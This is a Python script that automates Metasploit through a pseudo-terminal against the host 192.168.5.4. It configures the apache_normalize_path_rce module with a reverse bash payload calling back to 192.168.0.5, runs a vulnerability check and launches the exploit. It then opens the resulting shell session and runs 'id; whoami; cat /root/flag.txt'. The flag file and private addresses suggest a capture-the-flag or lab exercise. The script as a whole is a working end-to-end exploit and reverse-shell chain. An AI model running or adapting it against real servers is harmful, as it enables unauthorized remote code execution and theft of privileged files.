import json
import os
import pty
import re
import select
import subprocess
import sys
import time

TARGET = "192.168.5.4"
LHOST = "192.168.0.5"  # observed eth0 address with a route to the target
PROMPT_RE = re.compile(r"(?m)^msf\d+(?:\s+[^\r\n]*)?\s*>\s*$")
ANSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")


def clean(data):
    return ANSI_RE.sub("", data.decode("utf-8", errors="replace")).replace("\r", "")


def read_until_prompt(fd, timeout):
    data = bytearray()
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        ready, _, _ = select.select([fd], [], [], min(0.25, max(0, deadline - time.monotonic())))
        if not ready:
            continue
        try:
            chunk = os.read(fd, 65536)
        except OSError:
            break
        if not chunk:
            break
        data.extend(chunk)
        if PROMPT_RE.search(clean(data)):
            return bytes(data), True
    return bytes(data), False


def read_quiet(fd, initial_timeout=8.0, quiet_period=1.0):
    data = bytearray()
    deadline = time.monotonic() + initial_timeout
    last_data = time.monotonic()
    while time.monotonic() < deadline:
        wait = min(0.25, max(0.0, deadline - time.monotonic()))
        ready, _, _ = select.select([fd], [], [], wait)
        if ready:
            try:
                chunk = os.read(fd, 65536)
            except OSError:
                break
            if not chunk:
                break
            data.extend(chunk)
            last_data = time.monotonic()
        elif data and time.monotonic() - last_data >= quiet_period:
            break
    return bytes(data)


def send(fd, text):
    os.write(fd, (text + "\n").encode())


result = {
    "target": TARGET,
    "module": "exploit/multi/http/apache_normalize_path_rce",
    "configuration": {"RHOSTS": TARGET, "RPORT": "80", "LHOST": LHOST, "PAYLOAD": "cmd/unix/reverse_bash"},
    "check": {"attempted": False, "transcript": "", "indicates_vulnerable": False},
    "exploit": {"attempted": False, "transcript": ""},
    "session": {"reported": False, "id": None, "transcript": "", "flag_read_attempted": False, "flag_read_transcript": ""},
    "errors": [],
}

master = slave = None
proc = None
try:
    master, slave = pty.openpty()
    proc = subprocess.Popen(
        ["msfconsole", "-q"],
        stdin=slave,
        stdout=slave,
        stderr=slave,
        close_fds=True,
        start_new_session=True,
    )
    os.close(slave)
    slave = None

    startup, ready = read_until_prompt(master, 180)
    result["startup_transcript"] = clean(startup)
    if not ready:
        result["errors"].append("Metasploit did not present a console prompt before the startup timeout.")
    else:
        commands = [
            "use exploit/multi/http/apache_normalize_path_rce",
            "set RHOSTS " + TARGET,
            "set RPORT 80",
            "set PAYLOAD cmd/unix/reverse_bash",
            "set LHOST " + LHOST,
            "show options",
        ]
        config_transcripts = []
        for command in commands:
            send(master, command)
            transcript, ok = read_until_prompt(master, 45)
            config_transcripts.append({"command": command, "transcript": clean(transcript), "prompt_returned": ok})
            if not ok:
                result["errors"].append("Metasploit did not return to a prompt while configuring the candidate.")
                break
        result["configuration_transcripts"] = config_transcripts

        if not result["errors"]:
            result["check"]["attempted"] = True
            send(master, "check")
            check_output, ok = read_until_prompt(master, 120)
            result["check"]["transcript"] = clean(check_output)
            if not ok:
                result["errors"].append("Metasploit did not return to a prompt after the candidate check.")
            else:
                check_text = clean(check_output).lower()
                positive_markers = (
                    "checkcode::vulnerable",
                    "the target appears to be vulnerable",
                    "target appears to be vulnerable",
                    "the target is vulnerable",
                    "target is vulnerable",
                )
                result["check"]["indicates_vulnerable"] = any(marker in check_text for marker in positive_markers)

                if result["check"]["indicates_vulnerable"]:
                    result["exploit"]["attempted"] = True
                    send(master, "exploit -z")
                    exploit_output, exploit_prompt = read_until_prompt(master, 240)
                    result["exploit"]["transcript"] = clean(exploit_output)
                    if not exploit_prompt:
                        result["errors"].append("Metasploit did not return to a prompt after the justified exploit attempt.")
                    else:
                        send(master, "sessions -l")
                        sessions_output, sessions_prompt = read_until_prompt(master, 45)
                        result["session"]["transcript"] = clean(sessions_output)
                        if not sessions_prompt:
                            result["errors"].append("Metasploit did not return to a prompt after listing sessions.")
                        else:
                            session_text = clean(sessions_output)
                            match = re.search(r"(?im)^\s*(\d+)\s+(?:shell|meterpreter)\s+", session_text)
                            if match:
                                session_id = match.group(1)
                                result["session"]["reported"] = True
                                result["session"]["id"] = session_id
                                result["session"]["flag_read_attempted"] = True
                                send(master, "sessions -i " + session_id)
                                attach_output = read_quiet(master, initial_timeout=12, quiet_period=1.2)
                                result["session"]["flag_read_transcript"] += clean(attach_output)
                                send(master, "id; whoami; cat /root/flag.txt")
                                command_output = read_quiet(master, initial_timeout=15, quiet_period=2.0)
                                result["session"]["flag_read_transcript"] += clean(command_output)
                                send(master, "exit")
                                detach_output = read_quiet(master, initial_timeout=8, quiet_period=1.0)
                                result["session"]["flag_read_transcript"] += clean(detach_output)
                            else:
                                result["session"]["transcript"] += "\nNo shell or meterpreter session row was identified in the sessions listing."
                else:
                    result["check"]["note"] = "Check output did not contain a recognized positive vulnerability result; exploit was not attempted."

except FileNotFoundError as exc:
    result["errors"].append("Could not start msfconsole: " + str(exc))
except Exception as exc:
    result["errors"].append(type(exc).__name__ + ": " + str(exc))
finally:
    if proc is not None:
        try:
            if proc.poll() is None:
                os.write(master, b"exit\n")
                try:
                    proc.wait(timeout=8)
                except subprocess.TimeoutExpired:
                    proc.terminate()
                    try:
                        proc.wait(timeout=3)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.wait()
            result["console_exit_code"] = proc.returncode
        except Exception as exc:
            result["errors"].append("Console cleanup: " + type(exc).__name__ + ": " + str(exc))
    if master is not None:
        try:
            os.close(master)
        except OSError:
            pass
    if slave is not None:
        try:
            os.close(slave)
        except OSError:
            pass

print(json.dumps(result, ensure_ascii=False))

